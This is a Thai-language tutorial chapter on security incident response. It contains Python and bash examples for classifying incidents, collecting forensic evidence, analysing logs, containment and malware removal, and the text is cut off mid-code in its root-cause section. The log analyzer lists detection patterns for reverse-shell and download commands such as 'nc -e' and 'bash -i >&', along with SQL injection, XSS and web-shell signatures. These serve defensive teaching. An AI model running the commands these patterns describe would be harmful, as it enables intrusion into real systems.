# Part 66: Incident Response (การตอบสนองต่อเหตุการณ์ความปลอดภัย)

## สารบัญ
1. [Incident Response Overview](#incident-response-overview)
2. [Preparation Phase](#preparation-phase)
3. [Detection and Analysis](#detection-and-analysis)
4. [Containment Strategies](#containment-strategies)
5. [Eradication and Recovery](#eradication-and-recovery)
6. [Post-Incident Analysis](#post-incident-analysis)
7. [Digital Forensics Basics](#digital-forensics-basics)
8. [Memory Forensics](#memory-forensics)
9. [Network Forensics](#network-forensics)
10. [IR Automation Tools](#ir-automation-tools)

---

## 1. Incident Response Overview

### NIST IR Framework (SP 800-61)

```
วงจร Incident Response ตาม NIST:

┌─────────────────────────────────────────────────────────┐
│                    IR Lifecycle                          │
│                                                         │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────┐  │
│  │Preparation│→  │Detection │→   │Containment,      │  │
│  │           │   │& Analysis│    │Eradication,      │  │
│  └──────────┘   └──────────┘    │Recovery          │  │
│        ↑                         └──────────────────┘  │
│        │                                  │             │
│        └──────────────────────────────────┘             │
│              Post-Incident Activity                     │
└─────────────────────────────────────────────────────────┘
```

### ประเภท Incident ที่พบบ่อย

| ประเภท | ตัวอย่าง | ความรุนแรง |
|--------|----------|------------|
| Malware | Ransomware, Trojan | สูง |
| Data Breach | ข้อมูลรั่วไหล | สูงมาก |
| Unauthorized Access | Login ไม่ได้รับอนุญาต | สูง |
| DoS/DDoS | บริการล่ม | กลาง-สูง |
| Insider Threat | พนักงานทำร้าย | สูงมาก |
| Phishing | หลอกข้อมูล | กลาง |
| Web Attack | SQLi, XSS | กลาง-สูง |

### Incident Severity Classification

```python
#!/usr/bin/env python3
# incident_classifier.py - จัดลำดับความรุนแรง Incident

from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from typing import List, Dict, Optional
import json

class Severity(Enum):
    CRITICAL = 1  # ต้องตอบสนองทันที < 1 ชั่วโมง
    HIGH = 2      # ตอบสนองภายใน 4 ชั่วโมง
    MEDIUM = 3    # ตอบสนองภายใน 24 ชั่วโมง
    LOW = 4       # ตอบสนองภายใน 72 ชั่วโมง
    INFO = 5      # ติดตามสถานการณ์

class IncidentCategory(Enum):
    MALWARE = "malware"
    DATA_BREACH = "data_breach"
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    DENIAL_OF_SERVICE = "dos"
    INSIDER_THREAT = "insider_threat"
    PHISHING = "phishing"
    WEB_ATTACK = "web_attack"
    RANSOMWARE = "ransomware"
    APT = "apt"

@dataclass
class Incident:
    id: str
    title: str
    category: IncidentCategory
    description: str
    affected_systems: List[str] = field(default_factory=list)
    affected_users: int = 0
    data_exposed: bool = False
    system_down: bool = False
    lateral_movement: bool = False
    external_attacker: bool = True
    created_at: datetime = field(default_factory=datetime.now)
    severity: Optional[Severity] = None
    iocs: List[str] = field(default_factory=list)
    timeline: List[Dict] = field(default_factory=list)
    
    def calculate_severity(self) -> Severity:
        """คำนวณระดับความรุนแรงอัตโนมัติ"""
        score = 0
        
        # ปัจจัยด้านข้อมูล
        if self.data_exposed:
            score += 4
        if self.affected_users > 1000:
            score += 3
        elif self.affected_users > 100:
            score += 2
        elif self.affected_users > 10:
            score += 1
        
        # ปัจจัยด้านระบบ
        if self.system_down:
            score += 3
        if len(self.affected_systems) > 10:
            score += 3
        elif len(self.affected_systems) > 5:
            score += 2
        elif len(self.affected_systems) > 1:
            score += 1
        
        # ปัจจัยด้านการโจมตี
        if self.lateral_movement:
            score += 3
        if self.category in [IncidentCategory.RANSOMWARE, IncidentCategory.APT]:
            score += 4
        elif self.category in [IncidentCategory.DATA_BREACH, IncidentCategory.INSIDER_THREAT]:
            score += 3
        
        # แปลง score เป็น severity
        if score >= 10:
            return Severity.CRITICAL
        elif score >= 7:
            return Severity.HIGH
        elif score >= 4:
            return Severity.MEDIUM
        elif score >= 1:
            return Severity.LOW
        else:
            return Severity.INFO
    
    def add_timeline_event(self, event: str, analyst: str = "system"):
        """เพิ่มเหตุการณ์ใน timeline"""
        self.timeline.append({
            'timestamp': datetime.now().isoformat(),
            'event': event,
            'analyst': analyst
        })
    
    def add_ioc(self, ioc: str, ioc_type: str = "unknown"):
        """เพิ่ม Indicator of Compromise"""
        self.iocs.append(f"{ioc_type}:{ioc}")
    
    def generate_report(self) -> str:
        """สร้างรายงาน incident"""
        self.severity = self.calculate_severity()
        
        report = f"""
{'='*60}
INCIDENT REPORT
{'='*60}
ID: {self.id}
Title: {self.title}
Severity: {self.severity.name}
Category: {self.category.value}
Created: {self.created_at.strftime('%Y-%m-%d %H:%M:%S')}

Description:
{self.description}

Impact:
- Affected Systems: {len(self.affected_systems)}
- Affected Users: {self.affected_users}
- Data Exposed: {'YES' if self.data_exposed else 'NO'}
- System Down: {'YES' if self.system_down else 'NO'}
- Lateral Movement: {'YES' if self.lateral_movement else 'NO'}

Affected Systems:
{chr(10).join(f'  - {s}' for s in self.affected_systems)}

Indicators of Compromise (IOCs):
{chr(10).join(f'  - {ioc}' for ioc in self.iocs)}

Timeline:
{chr(10).join(f"  [{e['timestamp']}] {e['analyst']}: {e['event']}" for e in self.timeline)}
{'='*60}
"""
        return report


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    # สร้าง incident
    incident = Incident(
        id="INC-2024-001",
        title="Ransomware Attack on File Server",
        category=IncidentCategory.RANSOMWARE,
        description="พบ ransomware เข้ารหัสไฟล์บน File Server หลัก",
        affected_systems=["fileserver-01", "fileserver-02", "backup-server"],
        affected_users=250,
        data_exposed=True,
        system_down=True,
        lateral_movement=True
    )
    
    # เพิ่ม IOCs
    incident.add_ioc("192.168.1.100", "ip")
    incident.add_ioc("malware.exe", "filename")
    incident.add_ioc("abc123def456", "md5")
    incident.add_ioc("evil-domain.com", "domain")
    
    # เพิ่ม timeline
    incident.add_timeline_event("Ransomware detected by AV", "automated")
    incident.add_timeline_event("Network isolation initiated", "john.doe")
    incident.add_timeline_event("Incident escalated to CISO", "john.doe")
    
    print(incident.generate_report())
```

**ผลลัพธ์ที่คาดหวัง:**
```
============================================================
INCIDENT REPORT
============================================================
ID: INC-2024-001
Title: Ransomware Attack on File Server
Severity: CRITICAL
Category: ransomware
...
```

---

## 2. Preparation Phase

### สิ่งที่ต้องเตรียมก่อนเกิด Incident

```bash
# 1. ติดตั้ง IR Tools บน Kali Linux
apt update && apt install -y \
    volatility3 \
    autopsy \
    sleuthkit \
    foremost \
    binwalk \
    exiftool \
    wireshark \
    tcpdump \
    netstat-nat \
    yara \
    strings \
    hexdump

# 2. ติดตั้ง Python tools
pip3 install \
    pyshark \
    python-registry \
    construct \
    yara-python \
    pefile

# 3. เตรียม Evidence collection script
cat > /opt/ir/collect_evidence.sh << 'EOF'
#!/bin/bash
# collect_evidence.sh - เก็บหลักฐานจากระบบที่ถูกโจมตี

EVIDENCE_DIR="/evidence/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "[*] Collecting system information..."

# System info
uname -a > "$EVIDENCE_DIR/uname.txt"
hostname >> "$EVIDENCE_DIR/uname.txt"
id >> "$EVIDENCE_DIR/uname.txt"
date >> "$EVIDENCE_DIR/uname.txt"

# Network connections
echo "[*] Network connections..."
ss -tlnup > "$EVIDENCE_DIR/network_connections.txt"
netstat -tlnup >> "$EVIDENCE_DIR/network_connections.txt" 2>/dev/null
ip route > "$EVIDENCE_DIR/routes.txt"
cat /etc/hosts > "$EVIDENCE_DIR/hosts.txt"

# Running processes
echo "[*] Process list..."
ps auxf > "$EVIDENCE_DIR/processes.txt"
ls -la /proc/*/exe 2>/dev/null > "$EVIDENCE_DIR/proc_exe.txt"

# Logged-in users
echo "[*] User sessions..."
w > "$EVIDENCE_DIR/logged_users.txt"
last -20 >> "$EVIDENCE_DIR/logged_users.txt"
lastb -20 >> "$EVIDENCE_DIR/logged_users.txt" 2>/dev/null
who -a >> "$EVIDENCE_DIR/logged_users.txt"

# Cron jobs
echo "[*] Scheduled tasks..."
crontab -l > "$EVIDENCE_DIR/cron_root.txt" 2>/dev/null
ls -la /etc/cron* > "$EVIDENCE_DIR/cron_dirs.txt"
cat /etc/crontab >> "$EVIDENCE_DIR/cron_dirs.txt"

# Startup items
echo "[*] Startup items..."
systemctl list-units --type=service > "$EVIDENCE_DIR/services.txt"
ls -la /etc/init.d/ >> "$EVIDENCE_DIR/services.txt"
ls -la /etc/rc*.d/ >> "$EVIDENCE_DIR/services.txt"

# Recently modified files
echo "[*] Recently modified files..."
find / -mtime -7 -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null \
    > "$EVIDENCE_DIR/recent_files.txt"

# SUID files
echo "[*] SUID files..."
find / -perm -4000 2>/dev/null > "$EVIDENCE_DIR/suid_files.txt"

# Log files
echo "[*] Copying logs..."
mkdir -p "$EVIDENCE_DIR/logs"
cp /var/log/auth.log* "$EVIDENCE_DIR/logs/" 2>/dev/null
cp /var/log/syslog* "$EVIDENCE_DIR/logs/" 2>/dev/null
cp /var/log/apache2/*.log* "$EVIDENCE_DIR/logs/" 2>/dev/null
cp /var/log/nginx/*.log* "$EVIDENCE_DIR/logs/" 2>/dev/null
cp /var/log/wtmp "$EVIDENCE_DIR/logs/" 2>/dev/null
cp /var/log/btmp "$EVIDENCE_DIR/logs/" 2>/dev/null

# Bash history
echo "[*] Shell history..."
for user_home in /home/* /root; do
    user=$(basename $user_home)
    cat "$user_home/.bash_history" > "$EVIDENCE_DIR/${user}_bash_history.txt" 2>/dev/null
done

# Memory dump (ต้องการ privileges)
echo "[*] Attempting memory dump..."
if [ -f /proc/kcore ]; then
    dd if=/proc/kcore of="$EVIDENCE_DIR/memory.dump" bs=1M count=4096 2>/dev/null
fi

# Hash all collected files
echo "[*] Creating checksums..."
find "$EVIDENCE_DIR" -type f -exec sha256sum {} \; > "$EVIDENCE_DIR/checksums.txt"

# Create evidence package
echo "[*] Creating evidence archive..."
tar -czf "${EVIDENCE_DIR}.tar.gz" -C "$(dirname $EVIDENCE_DIR)" "$(basename $EVIDENCE_DIR)"
sha256sum "${EVIDENCE_DIR}.tar.gz" > "${EVIDENCE_DIR}.tar.gz.sha256"

echo "[+] Evidence collected: ${EVIDENCE_DIR}.tar.gz"
EOF
chmod +x /opt/ir/collect_evidence.sh
```

### IR Runbook Template

```markdown
# IR Runbook: Ransomware Response

## ขั้นตอนที่ 1: Detection (0-15 นาที)
- [ ] ยืนยันการแจ้งเตือน
- [ ] ระบุระบบที่ได้รับผลกระทบ
- [ ] เปิด incident ticket
- [ ] แจ้ง IR team

## ขั้นตอนที่ 2: Containment (15-60 นาที)
- [ ] Isolate ระบบที่ติดเชื้อ (ตัด network)
- [ ] Block IP/domain ที่เกี่ยวข้อง
- [ ] Disable compromised accounts
- [ ] เก็บ evidence ก่อน reboot

## ขั้นตอนที่ 3: Eradication (1-24 ชั่วโมง)
- [ ] ระบุ malware family
- [ ] ลบ malware ทุก artifact
- [ ] ปิดช่องโหว่ที่ถูกใช้
- [ ] Reset compromised credentials

## ขั้นตอนที่ 4: Recovery (24-72 ชั่วโมง)
- [ ] Restore จาก clean backup
- [ ] Verify ความสมบูรณ์ของระบบ
- [ ] Monitor ระบบ 72 ชั่วโมง
- [ ] Return to normal operation

## ขั้นตอนที่ 5: Lessons Learned (1 สัปดาห์หลัง)
- [ ] Post-incident meeting
- [ ] Root cause analysis
- [ ] Update IR procedures
- [ ] Improve detection
```

---

## 3. Detection and Analysis

### Log Analysis สำหรับ Incident Detection

```python
#!/usr/bin/env python3
# ir_log_analyzer.py - วิเคราะห์ log สำหรับ IR

import re
import json
from collections import defaultdict, Counter
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Tuple

class IRLogAnalyzer:
    """วิเคราะห์ log เพื่อหาสัญญาณการโจมตี"""
    
    def __init__(self):
        # Patterns ที่น่าสงสัย
        self.suspicious_commands = [
            r'wget\s+http',
            r'curl\s+-[A-Za-z]*o',
            r'base64\s+-d',
            r'python.*-c.*exec',
            r'chmod\s+\+x',
            r'\./(payload|shell|backdoor|exploit)',
            r'nc\s+-[A-Za-z]*e',
            r'bash\s+-i\s+>&',
            r'/bin/sh\s+-i',
            r'python.*socket.*exec',
            r'msfvenom',
            r'metasploit',
        ]
        
        self.suspicious_network = [
            r'(?:^|\s)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*(?:4444|4445|1337|31337|8888)',  # common reverse shell ports
        ]
        
        self.failed_login_threshold = 5  # จำนวนครั้ง fail login ก่อนแจ้งเตือน
    
    def analyze_auth_log(self, log_file: str) -> Dict:
        """วิเคราะห์ /var/log/auth.log"""
        results = {
            'failed_logins': defaultdict(int),
            'successful_logins': [],
            'sudo_usage': [],
            'brute_force_attempts': [],
            'privilege_escalation': [],
            'new_users': [],
            'suspicious_activities': []
        }
        
        with open(log_file, 'r', errors='ignore') as f:
            for line in f:
                line = line.strip()
                
                # Failed login attempts
                if 'Failed password' in line or 'authentication failure' in line:
                    # Extract IP address
                    ip_match = re.search(r'from (\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        ip = ip_match.group(1)
                        results['failed_logins'][ip] += 1
                
                # Successful logins
                elif 'Accepted password' in line or 'Accepted publickey' in line:
                    ip_match = re.search(r'from (\d+\.\d+\.\d+\.\d+)', line)
                    user_match = re.search(r'for (\S+) from', line)
                    if ip_match and user_match:
                        results['successful_logins'].append({
                            'user': user_match.group(1),
                            'ip': ip_match.group(1),
                            'line': line
                        })
                
                # Sudo usage
                elif 'sudo' in line.lower() and 'COMMAND' in line:
                    results['sudo_usage'].append(line)
                    # ตรวจหา suspicious commands
                    for pattern in self.suspicious_commands:
                        if re.search(pattern, line, re.IGNORECASE):
                            results['suspicious_activities'].append({
                                'type': 'suspicious_sudo',
                                'line': line,
                                'pattern': pattern
                            })
                
                # New user creation
                elif 'new user' in line.lower() or 'useradd' in line.lower():
                    results['new_users'].append(line)
                
                # Privilege escalation
                elif 'su:' in line and 'session opened' in line:
                    results['privilege_escalation'].append(line)
        
        # ระบุ brute force attempts
        for ip, count in results['failed_logins'].items():
            if count >= self.failed_login_threshold:
                results['brute_force_attempts'].append({
                    'ip': ip,
                    'attempts': count
                })
        
        return results
    
    def analyze_web_log(self, log_file: str) -> Dict:
        """วิเคราะห์ Apache/Nginx access log"""
        results = {
            'attack_patterns': [],
            'error_rates': defaultdict(int),
            'top_ips': Counter(),
            'suspicious_paths': [],
            'scanning_activity': []
        }
        
        # Web attack patterns
        attack_patterns = {
            'sql_injection': r"(?:' OR|UNION SELECT|1=1|--\+|/\*|xp_cmdshell)",
            'xss': r'(?:<script|javascript:|onerror=|onload=|alert\()',
            'lfi_rfi': r'(?:\.\.%2f|%2e%2e/|\.\./|file://|http://.*\.php)',
            'command_injection': r'(?:;\s*(?:id|whoami|cat|ls)|\|\s*(?:id|whoami)|`(?:id|whoami)`)',
            'scanner': r'(?:Nikto|sqlmap|Nessus|masscan|nmap)',
            'web_shell': r'(?:c99|r57|b374k|wso|eval\(base64)',
        }
        
        # Apache combined log format
        apache_pattern = re.compile(
            r'(\S+) \S+ \S+ \[(.+?)\] "(\w+) (.+?) HTTP/\S+" (\d+) (\d+)'
        )
        
        with open(log_file, 'r', errors='ignore') as f:
            for line in f:
                match = apache_pattern.match(line)
                if not match:
                    continue
                
                ip = match.group(1)
                method = match.group(3)
                path = match.group(4)
                status = int(match.group(5))
                
                results['top_ips'][ip] += 1
                results['error_rates'][status] += 1
                
                # ตรวจสอบ attack patterns
                for attack_type, pattern in attack_patterns.items():
                    if re.search(pattern, path + line, re.IGNORECASE):
                        results['attack_patterns'].append({
                            'type': attack_type,
                            'ip': ip,
                            'path': path,
                            'status': status
                        })
                
                # Suspicious paths
                if any(p in path for p in ['/etc/passwd', '/etc/shadow', '/proc/version', 
                                            '/.git/', '/wp-admin', '/phpmyadmin']):
                    results['suspicious_paths'].append({'ip': ip, 'path': path})
        
        # ระบุ scanning activity (IP ที่ request มากเกินไปใน error)
        for ip, count in results['top_ips'].most_common(20):
            if count > 100:
                results['scanning_activity'].append({'ip': ip, 'requests': count})
        
        return results
    
    def correlate_events(self, auth_results: Dict, web_results: Dict) -> List[Dict]:
        """เชื่อมโยงเหตุการณ์จาก logs หลายแหล่ง"""
        alerts = []
        
        # IPs ที่ทำ brute force
        brute_force_ips = {a['ip'] for a in auth_results.get('brute_force_attempts', [])}
        
        # ตรวจสอบว่า IP เดียวกันโจมตีหลายทาง
        web_attack_ips = {a['ip'] for a in web_results.get('attack_patterns', [])}
        
        # IPs ที่โจมตีทั้งสองทาง = APT candidate
        combined_attackers = brute_force_ips & web_attack_ips
        if combined_attackers:
            alerts.append({
                'severity': 'CRITICAL',
                'type': 'MULTI_VECTOR_ATTACK',
                'description': f'IPs attacking both SSH and Web: {combined_attackers}',
                'ips': list(combined_attackers)
            })
        
        # ตรวจสอบ successful login หลัง brute force
        for login in auth_results.get('successful_logins', []):
            if login['ip'] in brute_force_ips:
                alerts.append({
                    'severity': 'CRITICAL',
                    'type': 'SUCCESSFUL_BRUTE_FORCE',
                    'description': f"Successful login after brute force from {login['ip']}",
                    'user': login['user'],
                    'ip': login['ip']
                })
        
        return alerts
    
    def generate_iocs(self, auth_results: Dict, web_results: Dict) -> List[str]:
        """สร้าง IOC list จากการวิเคราะห์"""
        iocs = []
        
        # Attacker IPs
        for attempt in auth_results.get('brute_force_attempts', []):
            iocs.append(f"ip:{attempt['ip']}")
        
        for pattern in web_results.get('attack_patterns', []):
            iocs.append(f"ip:{pattern['ip']}")
        
        return list(set(iocs))  # dedup


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    analyzer = IRLogAnalyzer()
    
    # วิเคราะห์ logs
    # auth_results = analyzer.analyze_auth_log('/var/log/auth.log')
    # web_results = analyzer.analyze_web_log('/var/log/apache2/access.log')
    
    # Demo ด้วย mock data
    print("[*] IR Log Analyzer initialized")
    print("[*] Patterns loaded:")
    print(f"    - Suspicious commands: {len(analyzer.suspicious_commands)}")
    print(f"    - Brute force threshold: {analyzer.failed_login_threshold} failures")
    print("[+] Ready to analyze logs")
```

---

## 4. Containment Strategies

### Network Isolation Techniques

```bash
#!/bin/bash
# containment.sh - ควบคุม incident และแยก infected hosts

INFECTED_IP="192.168.1.100"
INFECTED_MAC="aa:bb:cc:dd:ee:ff"

echo "[*] Initiating containment for $INFECTED_IP"

# ===== Firewall Containment =====
# Block traffic จาก infected host
iptables -I INPUT -s $INFECTED_IP -j DROP
iptables -I FORWARD -s $INFECTED_IP -j DROP

# Block traffic ไปยัง infected host (ยกเว้น admin)
iptables -I OUTPUT -d $INFECTED_IP -j DROP
# อนุญาต admin access สำหรับ forensics
iptables -I INPUT -s 10.0.0.1 -d $INFECTED_IP -j ACCEPT

echo "[+] Firewall rules applied"

# ===== Network Level Isolation =====
# 1. Null route (Black hole routing)
ip route add blackhole $INFECTED_IP/32

# 2. ARP block (บน network switch ผ่าน SNMP - ถ้ามี)
# snmpset -v2c -c private switch_ip 1.3.6.1.2.1.17.7.1.3.1.1.4.X status i 6

# 3. ปิด port บน switch (ถ้ามี access)
echo "[!] Manual action required: Disable switch port for $INFECTED_MAC"

# ===== DNS Sinkholing =====
# Redirect malicious domains ไปยัง sinkhole
MALICIOUS_DOMAINS=("evil-c2.com" "malware-update.net" "botnet-ctrl.org")

for domain in "${MALICIOUS_DOMAINS[@]}"; do
    echo "127.0.0.1 $domain" >> /etc/hosts
    echo "[+] DNS sinkholes: $domain"
done

# ===== Evidence Preservation =====
echo "[*] Preserving evidence before further containment..."

# Capture network traffic
tcpdump -i eth0 -w "/evidence/capture_$(date +%Y%m%d_%H%M%S).pcap" \
    host $INFECTED_IP -c 10000 &

echo "[*] Network capture started (PID: $!)"

# ===== Account Lockout =====
# Lock compromised accounts
COMPROMISED_USERS=("john.doe" "service_account")

for user in "${COMPROMISED_USERS[@]}"; do
    # Lock account
    usermod -L $user 2>/dev/null
    passwd -l $user 2>/dev/null
    
    # Kill active sessions
    pkill -u $user -9 2>/dev/null
    
    echo "[+] Locked account: $user"
done

# ===== Service Containment =====
# หยุด services ที่อาจถูก compromise
SUSPICIOUS_SERVICES=("malware_service" "backdoor_daemon")

for service in "${SUSPICIOUS_SERVICES[@]}"; do
    if systemctl is-active --quiet $service; then
        systemctl stop $service
        systemctl disable $service
        echo "[+] Stopped service: $service"
    fi
done

echo "[+] Containment complete"
echo "[!] Remember to:"
echo "    1. Notify stakeholders"
echo "    2. Document all actions taken"
echo "    3. Begin forensic investigation"
```

---

## 5. Eradication and Recovery

### Malware Removal Script

```python
#!/usr/bin/env python3
# malware_eradication.py - ลบ malware และ artifacts

import os
import subprocess
import hashlib
import json
import yara
from pathlib import Path
from typing import List, Dict

class MalwareEradicator:
    """ลบ malware และ restore ระบบ"""
    
    def __init__(self, iocs_file: str = None):
        self.malicious_files: List[str] = []
        self.malicious_ips: List[str] = []
        self.malicious_domains: List[str] = []
        self.malicious_hashes: List[str] = []
        self.persistence_mechanisms: List[Dict] = []
        
        if iocs_file:
            self.load_iocs(iocs_file)
    
    def load_iocs(self, iocs_file: str):
        """โหลด IOCs จากไฟล์"""
        with open(iocs_file) as f:
            iocs = json.load(f)
        
        self.malicious_files = iocs.get('files', [])
        self.malicious_ips = iocs.get('ips', [])
        self.malicious_domains = iocs.get('domains', [])
        self.malicious_hashes = iocs.get('hashes', [])
    
    def scan_filesystem(self, scan_path: str = '/') -> List[str]:
        """สแกนหาไฟล์ที่ต้องสงสัย"""
        found_files = []
        
        for path in Path(scan_path).rglob('*'):
            if not path.is_file():
                continue
            
            try:
                # ตรวจสอบชื่อไฟล์
                for malicious in self.malicious_files:
                    if path.name == malicious or str(path) == malicious:
                        found_files.append(str(path))
                        break
                
                # ตรวจสอบ hash
                if path.stat().st_size < 100 * 1024 * 1024:  # < 100MB
                    file_hash = self._calculate_hash(str(path))
                    if file_hash in self.malicious_hashes:
                        found_files.append(str(path))
            except (PermissionError, OSError):
                pass
        
        return found_files
    
    def _calculate_hash(self, filepath: str) -> str:
        """คำนวณ SHA256 hash"""
        sha256 = hashlib.sha256()
        try:
            with open(filepath, 'rb') as f:
                while chunk := f.read(8192):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except:
            return ''
    
    def check_persistence(self) -> List[Dict]:
        """ตรวจสอบ persistence mechanisms"""
        persistence = []
        
        # 1. Cron jobs
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if line and not line.startswith('#'):
                    persistence.append({
                        'type': 'cron',
                        'value': line,
                        'suspicious': any(s in line for s in self.malicious_files)
                    })
        except:
            pass
        
        # 2. Systemd services
        service_dirs = ['/etc/systemd/system/', '/usr/lib/systemd/system/']
        for service_dir in service_dirs:
            if Path(service_dir).exists():
                for service_file in Path(service_dir).glob('*.service'):
                    try:
                        content = service_file.read_text()
                        if any(malicious in content for malicious in self.malicious_files):
                            persistence.append({
                                'type': 'systemd',
                                'value': str(service_file),
                                'suspicious': True
                            })
                    except:
                        pass
        
        # 3. /etc/rc.local
        rc_local = Path('/etc/rc.local')
        if rc_local.exists():
            content = rc_local.read_text()
            for malicious in self.malicious_files:
                if malicious in content:
                    persistence.append({
                        'type': 'rc.local',
                        'value': f'rc.local contains: {malicious}',
                        'suspicious': True
                    })
        
        # 4. SSH authorized_keys
        for home_dir in Path('/home').iterdir():
            auth_keys = home_dir / '.ssh' / 'authorized_keys'
            if auth_keys.exists():
                persistence.append({
                    'type': 'ssh_keys',
                    'value': str(auth_keys),
                    'suspicious': False  # ต้องตรวจสอบเองว่า key ไหนน่าสงสัย
                })
        
        return persistence
    
    def remove_malware(self, dry_run: bool = True) -> Dict:
        """ลบ malware (dry_run=True เพื่อ preview)"""
        report = {
            'would_remove': [],
            'removed': [],
            'errors': [],
            'persistence_removed': []
        }
        
        # สแกนหา malicious files
        print("[*] Scanning filesystem...")
        found = self.scan_filesystem()
        
        for filepath in found:
            if dry_run:
                report['would_remove'].append(filepath)
                print(f"[DRY RUN] Would remove: {filepath}")
            else:
                try:
                    os.remove(filepath)
                    report['removed'].append(filepath)
                    print(f"[+] Removed: {filepath}")
                except Exception as e:
                    report['errors'].append({'file': filepath, 'error': str(e)})
                    print(f"[-] Error removing {filepath}: {e}")
        
        # ตรวจสอบ persistence
        print("\n[*] Checking persistence mechanisms...")
        persistence = self.check_persistence()
        
        for mechanism in persistence:
            if mechanism['suspicious']:
                print(f"[!] Suspicious persistence found:")
                print(f"    Type: {mechanism['type']}")
                print(f"    Value: {mechanism['value']}")
        
        return report
    
    def clean_network_artifacts(self):
        """ลบ network artifacts (firewall rules, DNS, etc.)"""
        actions = []
        
        # Block malicious IPs ใน firewall
        for ip in self.malicious_ips:
            cmd = f"iptables -A OUTPUT -d {ip} -j DROP"
            actions.append(cmd)
            print(f"[+] Blocking IP: {ip}")
        
        # Add malicious domains to /etc/hosts
        if self.malicious_domains:
            with open('/etc/hosts', 'a') as f:
                for domain in self.malicious_domains:
                    f.write(f"127.0.0.1 {domain}\n")
                    actions.append(f"Sinkholes: {domain}")
                    print(f"[+] Domain sinkholes: {domain}")
        
        return actions


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    # สร้าง IOC file
    iocs = {
        "files": ["malware.exe", "backdoor.sh", "payload.py"],
        "ips": ["192.168.100.1", "10.0.0.99"],
        "domains": ["evil-c2.com", "malware.net"],
        "hashes": [
            "abc123def456abc123def456abc123def456abc123def456abc123def456ab12"
        ]
    }
    
    with open('/tmp/iocs.json', 'w') as f:
        json.dump(iocs, f)
    
    eradicator = MalwareEradicator('/tmp/iocs.json')
    
    # ตรวจสอบก่อนลบ (dry run)
    print("[*] Running in DRY RUN mode...")
    report = eradicator.remove_malware(dry_run=True)
    
    print(f"\n[*] Summary:")
    print(f"    Files that would be removed: {len(report['would_remove'])}")
    
    # Clean network
    eradicator.clean_network_artifacts()
```

---

## 6. Post-Incident Analysis

### Root Cause Analysis (RCA) Framework

```python
#!/usr/bin/env python3
# rca_framework.py - Root Cause Analysis สำหรับ Security Incidents

from dataclasses import dataclass, field
from typing import List, Optional
from enum import Enum

class CauseType(Enum):
    TECHNICAL = "Technical"
    HUMAN = "Human Error"
    PROCESS = "Process Gap"
    EXTERNAL = "External Threat"

@dataclass
class Cause:
    description: str
    cause_type: CauseType
    is_root_cause: bool = False
    contributing_factor: bool = False
    remediation: str = ""

@dataclass
class RCA:
    incident_id: str
    incident_title: str
    executive_summary: str
    timeline: List[dict] = field(default_factory=list)
    causes: List[Cause] = field(default_factory=list)
    five_whys: List[str] = field(default_factory=list)
    impact: dict = field(default_factory=dict)
    lessons_learned: List[str] = field(default_factory=list)
    action_items: List[dict] = field(default_factory=list)
    
    def add_five_why(self, question: str, answer: str):
        self.five_whys.append({"why": question, "because": answer})
    
    def add_action_item(self, action: str, owner: str, due_date: str, priority: str = "Medium"):
        self.action_items.append({
            'action': action,
            'owner': owner,
            'due_date': due_date,
            'priority': priority,
            'status': 'Open'
        })
    
    def generate_report(self) -> str:
        report = f"""
# Root Cause Analysis Report
## Incident: {self.incident_title} ({self.incident_id})

## Executive Summary
{self.executive_summary}

## Timeline of Events
"""
        for event in self.timeline:
            report += f"- **{event.get('time', 'N/A')}**: {event.get('event', '')}\n"
        
        report += "\n## 5 Whys Analysis\n"
        for i, why in enumerate(self.five_whys, 1):
            if isinstance(why, dict):
                report += f"**Why #{i}**: {why.get('why', '')}\n"
                report += f"*Because*: {why.get('because', '')}\n\n"
        
        report += "\n## Root Causes\n"
        for cause in self.causes:
            if cause.is_root_cause:
                report += f"- **ROOT**: [{cause.cause_type.value}] {cause.description}\n"
                report += f"  - Remediation: {cause.remediation}\n"
        
        report += "\n## Contributing Factors\n"
        for cause in self.causes:
            if cause.contributing_factor:
                report += f"- [{cause.cause_type.value}] {cause.description}\n"
        
        report += "\n## Lessons Learned\n"
        for lesson in self.lessons_learned:
            report += f"- {lesson}\n"
        
        report += "\n## Action Items\n"
        report += "| Action | Owner | Due Date | Priority | Status |\n"
        report += "|--------|-------|----------|----------|--------|\n"
        for item in self.action_items:
            report += f"| {item['action']} | {item['owner']} | {item['due_date']} | {item['priority']} | {item['status']} |\n"
        
        return report


# ตัวอย่าง RCA
if __name__ == "__main__":
    rca = RCA(
        incident_id="INC-2024-001",
        incident_title="Ransomware Attack via Phishing Email",
        executive_summary="เกิดการโจมตีด้วย ransomware หลังจากพนักงานคลิก phishing email ส่งผลให้ระบบ file server ล่ม 24 ชั่วโมง"
    )
    
    # Timeline
    rca.timeline = [
        {"time": "08:30", "event": "พนักงานรับ phishing email"},
        {"time": "08:45", "event": "คลิก link และดาวน์โหลด payload"},
        {"time": "09:00", "event": "Ransomware เริ่ม encrypt ไฟล์"},
        {"time": "10:30", "event": "IT รับแจ้ง ระบบทำงานช้า"},
        {"time": "11:00", "event": "ระบุว่าเป็น ransomware"},
        {"time": "11:30", "event": "Isolate ระบบที่ติดเชื้อ"},
        {"time": "14:00", "event": "เริ่ม recovery จาก backup"},
        {"time": "09:00+1d", "event": "ระบบกลับมาทำงาน"}
    ]
    
    # 5 Whys
    rca.add_five_why(
        "ทำไม ransomware จึงเข้าระบบได้?",
        "พนักงานคลิก malicious link ใน email"
    )
    rca.add_five_why(
        "ทำไมพนักงานจึงคลิก link?",
        "ไม่ได้รับการอบรม phishing awareness"
    )
    rca.add_five_why(
        "ทำไมจึงไม่มีการอบรม?",
        "ไม่มีงบประมาณและนโยบาย security training"
    )
    rca.add_five_why(
        "ทำไม email filter จึงไม่กรอง?",
        "Email gateway ไม่ได้ configure sandbox analysis"
    )
    rca.add_five_why(
        "ทำไม ransomware จึง spread ได้?",
        "ไม่มีการ segment network และ least privilege"
    )
    
    # Causes
    rca.causes = [
